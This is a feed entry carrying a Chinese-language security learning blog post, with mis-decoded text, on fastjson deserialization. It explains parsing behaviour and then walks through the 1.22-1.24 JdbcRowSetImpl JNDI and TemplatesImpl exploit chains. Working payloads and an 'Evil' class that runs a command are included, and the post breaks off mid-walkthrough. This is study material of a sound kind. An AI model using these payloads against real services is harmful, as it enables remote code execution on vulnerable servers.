    <link href="https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/08/24/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-08-23T17:35:44.000Z</published>
    <updated>2024-09-14T10:30:05.867Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="fastjsonä»‹ç»">fastjsonä»‹ç»</span></h1><p>å®˜æ–¹githubåœ°å€ï¼š<a href="https://github.com/alibaba/fastjson">https://github.com/alibaba/fastjson</a></p><p>fastjsonæ˜¯é˜¿é‡Œå·´å·´çš„å¼€æºJSONè§£æåº“ï¼Œå®ƒå¯ä»¥è§£æJSONæ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°†Java Beanåºåˆ—åŒ–ä¸ºJSONå­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä»JSONå­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p><p><strong>ç®€å•ä¾‹å­</strong></p><p>ç”¨Jsonçš„toJSONStringæ–¹æ³•å°†pojoç±»è½¬æ¢æˆå­—ç¬¦ä¸²</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281554948.png" alt="image-20240828155427856"></p><p>è¿™é‡Œçš„<strong>SerializerFeature.WriteClassName</strong>é¡¾åæ€ä¹‰å°±æ˜¯æŒ‡å®šåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²çš„æ ¼å¼ï¼Œè¿™é‡Œå°±æ˜¯å†™å‡ºç±»åå’Œé”®å€¼å¯¹å½¢å¼ï¼Œæ›´å¤šçš„å¯ä»¥çœ‹æºç å°è¯•</p><p>JSON.parseObjectå°†å­—ç¬¦ä¸²è½¬æ¢å›pojo</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">student</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<br>        student.setName(<span class="hljs-string">&quot;clown&quot;</span>);<br>        student.setAge(<span class="hljs-number">23333</span>);<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteClassName));<br>        System.out.println(JSON.toJSONString(student, SerializerFeature.WriteEnumUsingToString));<br>        <span class="hljs-comment">//è½¬å˜å›pojo</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class, Feature.SupportNonPublicField);<br>        System.out.println(obj);<br>        System.out.println(obj.getClass().getName());<br>        System.out.println(obj.getName() + <span class="hljs-string">&quot; &quot;</span> + obj.getAge());<br>        <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408281555070.png" alt="image-20240828155545016"></p><p>è¿™é‡Œæ³¨æ„è¦å†™å…¨ç±»åä¸ç„¶ä¼šæŠ¥é”™</p><p>è¿™é‡Œçš„<strong>Feature.SupportNonPublicField</strong>é¡¾åæ€ä¹‰ä¹Ÿæ˜¯è¿˜åŸçš„ç‰¹ç‚¹ï¼Œè¿™é‡Œæ˜¯è¿˜åŸç§æœ‰å±æ€§</p><p>ç„¶åæˆ‘ä»¬æ³¨æ„åˆ°è¿™é‡Œè½¬æ¢æˆpojoå¯¹è±¡æ—¶ä¼šè°ƒç”¨æ„é€ å‡½æ•°ï¼Œå…¶å®è¿˜ä¼šè°ƒç”¨ä»–çš„setå’Œgetæ–¹æ³•ï¼Œæ‰€ä»¥fastjsonçš„ååºåˆ—åŒ–æŒ‡çš„å¹¶ä¸æ˜¯javaåŸç”Ÿçš„ååºåˆ—åŒ–ï¼Œè€Œæ˜¯ä»–jsonè½¬åŒ–çš„è¿‡ç¨‹ã€‚</p><p>å°†ä»£ç æ”¹ä¸€ä¸‹çœ‹ä¸€ä¸‹æ•ˆæœ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Test1;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.serializer.SerializerFeature;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Student</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Studentæ„é€ å‡½æ•°&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getAge&quot;</span>);<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setAge&quot;</span>);<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMap</span><span class="hljs-params">(String map)</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;setMap&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getMap</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;getMap&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•ä¼šè°ƒç”¨getå’Œsetæ–¹æ³•</span><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;,\&quot;map\&quot;:\&quot;ceshi\&quot;&#125;&quot;</span>);<br>        <span class="hljs-type">Student</span> <span class="hljs-variable">javaObject</span> <span class="hljs-operator">=</span> obj.toJavaObject(Student.class); <span class="hljs-comment">//åªä¼ ä¸€ä¸ªå‚æ•°åªè¿”å›JSONObjectç±»å‹ï¼Œå¯ä»¥è¿™æ ·è½¬æ¢</span><br>        <span class="hljs-comment">//System.out.println(javaObject.getName() + &quot; &quot; + javaObject.getAge()+ &quot; &quot; + javaObject.getMap());</span><br>        System.out.println(<span class="hljs-string">&quot;------------------&quot;</span>);<br>        <span class="hljs-comment">//è¿™ç§æ–¹æ³•åªè°ƒç”¨setæ–¹æ³•</span><br>        <span class="hljs-type">Student</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> JSON.parseObject(<span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.clown.Test1.Student\&quot;,\&quot;age\&quot;:23333,\&quot;name\&quot;:\&quot;clown\&quot;&#125;&quot;</span>, Student.class);<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408282208338.png" alt="image-20240828220804265"></p><p>å¯ä»¥çœ‹åˆ°è½¬æ¢çš„æ—¶å€™ä¼šå†ä¸€æ¬¡è°ƒç”¨setæ–¹æ³•ï¼Œè€Œä¸”æ³¨æ„è¿™é‡Œçš„mapå±æ€§æˆ‘æ˜¯æ²¡æœ‰è®¾ç½®çš„ï¼Œä½†è¦æ˜¯æˆ‘çš„jsonå­—ç¬¦ä¸²é‡Œæœ‰mapå±æ€§ä¹Ÿä¼šè°ƒç”¨å¯¹åº”çš„æ–¹æ³•ï¼Œä¸è¿‡å¯¹åº”çš„javaå¯¹è±¡getå›æ¥çš„å±æ€§å€¼å°±ä¸ºnull</p><p>è¿™é‡Œcopyä¸€ä¸‹y4âœŒçš„æ€»ç»“ï¼š<a href="https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md">https://github.com/Y4tacker/JavaSec/blob/main/3.FastJson%E4%B8%93%E5%8C%BA/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95/Fastjson%E5%9F%BA%E6%9C%AC%E7%94%A8%E6%B3%95.md</a></p><ul><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassæ—¶ï¼Œä¼šè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€æ‰€æœ‰å±æ€§çš„getteræ–¹æ³•ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ï¼Œå…¶ä¸­propertieså±æ€§çš„getteræ–¹æ³•ä¼šè¢«è°ƒç”¨ä¸¤æ¬¡ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*,*.class)</code>å½¢å¼å³æŒ‡å®šclassæ—¶ï¼Œåªè°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„ç±»çš„æ„é€ å‡½æ•°ã€JSONé‡Œé¢çš„éç§æœ‰å±æ€§çš„setteræ–¹æ³•ã€propertieså±æ€§çš„getteræ–¹æ³•ï¼›</li><li>å½“ååºåˆ—åŒ–ä¸º<code>JSON.parseObject(*)</code>å½¢å¼å³æœªæŒ‡å®šclassè¿›è¡Œååºåˆ—åŒ–æ—¶å¾—åˆ°çš„éƒ½æ˜¯JSONObjectç±»å¯¹è±¡ï¼Œè€Œåªè¦æŒ‡å®šäº†classå³<code>JSON.parseObject(*,*.class)</code>å½¢å¼å¾—åˆ°çš„éƒ½æ˜¯ç‰¹å®šçš„Studentç±»ï¼›</li></ul><blockquote><p>è¿˜æœ‰æºç çš„è°ƒç”¨åˆ†æä¸å†™äº†å¤ªè‡­å¤ªé•¿äº†ï¼Œçœ‹ç»„é•¿çš„è§†é¢‘å·²ç»è¦æ™•äº†ï¼Œåé¢çœ‹é“¾å­çš„æ—¶å€™ç©¿æ’ç€åˆ†æå§</p></blockquote><p>è¿™é‡Œè¿˜æœ‰ä¸€å¼ è°ƒç”¨ç±»çš„å…³ç³»å›¾</p><p><img src="https://cdn.clown2024.cn/202408282214028.png" alt="1"></p><blockquote><p>JSONï¼šé—¨é¢ç±»ï¼Œæä¾›å…¥å£</p><p>DefaultJSONParserï¼šä¸»ç±»</p><p>ParserConfigï¼šé…ç½®ç›¸å…³ç±»</p><p>JSONLexerBaseï¼šå­—ç¬¦åˆ†æç±»</p><p>JavaBeanDeserializerï¼šJavaBeanååºåˆ—åŒ–ç±»</p></blockquote><p>fastjsonçš„åˆ©ç”¨çš„å…¥å£ç‚¹å°±æ˜¯å¯¹åº”çš„setæˆ–getæ–¹æ³•çš„é“¾å­</p><h1><span id="fastjson122-124-jndi">Fastjson1.22-1.24 JNDI</span></h1><h2><span id="åŸºäºjdbcrowsetimplçš„åˆ©ç”¨é“¾">åŸºäºJdbcRowSetImplçš„åˆ©ç”¨é“¾</span></h2><p>ä»–çš„è§¦å‘ç‚¹åœ¨**JdbcRowSetImpl#connect()**é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202408291556886.png" alt="image-20240829155500981"></p><p>payloadï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:9999/mQAZldWR\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;<br>JSON.parse(payload);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202408291630333.png" alt="image-20240829163040221"></p><blockquote><p>è¿™é‡Œpayloadç”¨parseæˆ–è€…parseObjectéƒ½èƒ½è§¦å‘</p><p>è¿™é‡Œè¿˜å­¦åˆ°äº†ç”¨yakitç›´æ¥æ­å»ºJNDIæœåŠ¡å™¨ï¼Œç‰¹åˆ«æ–¹ä¾¿</p><p><img src="https://cdn.clown2024.cn/202408291629022.png" alt="image-20240829162951907"></p><p>é…ç½®ä¸€ä¸‹payloadå°±èƒ½ç›´æ¥ç”¨äº†</p></blockquote><p>çœ‹ä¸€ä¸‹åˆ©ç”¨é“¾è¿‡ç¨‹å§ï¼Œè¿™æ˜¯ä»setæ–¹æ³•æ‰“çš„ï¼Œæ ¹æ®payloadæˆ‘ä»¬å»çœ‹ä¸€ä¸‹setAutoCommitæ–¹æ³•ï¼Œå› ä¸ºæˆ‘ä»¬è®¾ç½®äº†autoCommitå±æ€§ä»–å°±ä¼šèµ°åˆ°è¿™</p><p><img src="https://cdn.clown2024.cn/202408291726876.png" alt="image-20240829172622802"></p><p>è¿™é‡Œconnä¸€å¼€å§‹ä¸ºç©ºå°±ä¼šèµ°åˆ°connect()æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408291730922.png" alt="image-20240829173035857"></p><p><img src="https://cdn.clown2024.cn/202408291730868.png" alt="image-20240829173051811"></p><p>ç„¶åæˆ‘ä»¬payloadé‡Œé¢æ§åˆ¶äº†ä¸€ä¸‹dataSourceå±æ€§å€¼ä¸ºæ¶æ„ldapæœåŠ¡å™¨å³å¯</p><p><strong>è°ƒè¯•ä¸€ä¸‹æ‰§è¡Œæµç¨‹</strong></p><p>å…¶å®å°±æ˜¯èµ°ä¸€ä¸‹å‰é¢æ²¡åˆ†æçš„ååºåˆ—åŒ–çš„è¿‡ç¨‹é¡ºä¾¿è°ƒä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408291632353.png" alt="image-20240829163154441"></p><p>å› ä¸ºè¦åˆ°toJSONæ–¹æ³•æ‰ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œå‰é¢ç›´æ¥åˆ°parseè°ƒç”¨setæ–¹æ³•è§¦å‘æ›´å®¹æ˜“æ»¡è¶³æ¡ä»¶</p><p>ä¸€è·¯è·Ÿè¿›åˆ°è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408291705004.png" alt="image-20240829170515929"></p><p>è·å–ä¸€ä¸ªååºåˆ—åŒ–å™¨ï¼Œç„¶åç»§ç»­å¾€é‡Œè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408291700828.png" alt="image-20240829170031726"></p><p>è¿™é‡Œå»ºç«‹ä¸€ä¸ªJavaBeanInfoç±»ï¼Œé‡Œé¢å°±è¿›è¡Œäº†å¯¹è¯¥ç±»çš„å„ç§å­—æ®µå’Œæ–¹æ³•è¿˜æœ‰æ„é€ å™¨çš„å°è£…ç­‰ï¼Œåé¢æœ‰é“¾å­éœ€è¦åˆ©ç”¨åˆ°å†è¯¦ç»†è¯´</p><p><img src="https://cdn.clown2024.cn/202408291649160.png" alt="image-20240829164912083"></p><p>ç„¶åç»§ç»­è·Ÿè¿›åˆ°æ‰§è¡Œlookupçš„åœ°æ–¹</p><p><img src="https://cdn.clown2024.cn/202408291719865.png" alt="image-20240829171913782"></p><p>è¿™é‡Œçš„getDataSourceName()æˆ‘ä»¬å¯ä»¥æ§åˆ¶</p><p><img src="https://cdn.clown2024.cn/202408291719522.png" alt="image-20240829171950465"></p><p>ç„¶åæˆåŠŸå¼¹è®¡ç®—å™¨ã€‚</p><p>ä¸è¿‡jndiçš„æ‰“æ³•æœ‰ç‰ˆæœ¬é™åˆ¶ã€ä¾èµ–é™åˆ¶ä»¥åŠè¦å‡ºç½‘</p><h1><span id="fastjson122-124-templatesimpl">Fastjson1.22-1.24 TemplatesImpl</span></h1><p><strong>é™åˆ¶</strong></p><p>è¯¥åˆ©ç”¨é“¾éœ€è¦è®¾ç½®<code>Feature.SupportNonPublicField</code>æ‰èƒ½æˆåŠŸè§¦å‘</p><p><strong>åˆ©ç”¨ä»£ç </strong></p><p>å†™ä¸€ä¸ªæ¶æ„ç±»ç»§æ‰¿<strong>AbstractTranslet</strong> </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Evil</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> &#123;<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> &#123;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Evil</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å†å†™ä¸€ä¸ªexp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Templates;<br><br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.Feature;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.*;<br><span class="hljs-keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;<br><br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Exploit</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">readClass</span><span class="hljs-params">(String cls)</span>&#123;<br>        <span class="hljs-type">byte</span>[] buffer = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(cls);<br>            <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>            <span class="hljs-type">byte</span>[] b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>            <span class="hljs-type">int</span> n;<br>            <span class="hljs-keyword">while</span>((n = fis.read(b))!=-<span class="hljs-number">1</span>) &#123;<br>                bos.write(b,<span class="hljs-number">0</span>,n);<br>            &#125;<br>            fis.close();<br>            bos.close();<br>            buffer = bos.toByteArray();<br>        &#125;<span class="hljs-keyword">catch</span>(Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> encoder.encodeToString(buffer);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String args[])</span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">evilClassPath</span> <span class="hljs-operator">=</span> System.getProperty(<span class="hljs-string">&quot;user.dir&quot;</span>) + <span class="hljs-string">&quot;\\target\\classes\\org\\clown\\Templates\\Evil.class&quot;</span>;<br>            System.out.println(evilClassPath);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">evilCode</span> <span class="hljs-operator">=</span> readClass(evilClassPath);<br>            <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">NASTY_CLASS</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +<br>                    <span class="hljs-string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="hljs-string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +<br>                    <span class="hljs-string">&quot;\&quot;_version\&quot;:\&quot;\&quot;&#125;\n&quot;</span>;<br><br>            JSON.parseObject(payload, Feature.SupportNonPublicField);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ</p><p><img src="https://cdn.clown2024.cn/202408301123547.png" alt="image-20240830112259389"></p><p><strong>è°ƒç”¨æµç¨‹åˆ†æ</strong></p><p>Fastjsoné»˜è®¤åªä¼šååºåˆ—åŒ–publicä¿®é¥°çš„å±æ€§ï¼ŒoutputPropertieså’Œ_bytecodesç”±privateä¿®é¥°ï¼Œå¿…é¡»åŠ å…¥<code>Feature.SupportNonPublicField</code>åœ¨parseObjectä¸­æ‰èƒ½è§¦å‘</p><p>ç°åœ¨parseObjectä¸‹æ–­ç‚¹ï¼Œç„¶åè·Ÿè¿›</p><p><img src="https://cdn.clown2024.cn/202408301652896.png" alt="image-20240830165233826"></p><p>ç»§ç»­è·Ÿè¿›è¿™ä¸ªDefaultJSONParseræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301658846.png" alt="image-20240830165823736"></p><p>è¿™é‡Œtokenèµ‹çš„å€¼ä¸º12ï¼Œå…ˆè®°ä½</p><p><img src="https://cdn.clown2024.cn/202408301700254.png" alt="image-20240830170035160"></p><p>ç„¶åç»§ç»­è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301704915.png" alt="image-20240830170443834"></p><p>ä¸€è·¯è·Ÿè¿›åˆ°DefaultJSONParserçš„parseæ–¹æ³•ï¼Œç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301706899.png" alt="image-20240830170659818"></p><p>ç„¶åæ ¹æ®tokenä¸º12ä»£è¡¨â€{â€œåˆ¤æ–­åˆ°è¿™ï¼Œæˆ‘ä»¬è·Ÿè¿›parseObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202408301709246.png" alt="image-20240830170954179"></p><p>è¿›åˆ°è¿™é‡Œéå†lexerçš„textå±æ€§é‡Œæˆ‘ä»¬ä¼ çš„jsonå­—ç¬¦ä¸²ï¼Œä¸€å¼€å§‹æ‰«æåˆ°â€™â€â€˜å­—ç¬¦</p><p>ç„¶åå°±èµ°åˆ°ä¸‹é¢è¿™é‡Œ</p><p><img src="https://cdn.clown2024.cn/202408301713804.png" alt="image-20240830171321736"></p><p>ç„¶åå–å¾—keyä¸º@type</p><p><img src="https://cdn.clown2024.cn/202408301715496.png" alt="image-20240830171538418"></p><p>ç„¶åç»§ç»­å¾€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202408301720580.png" 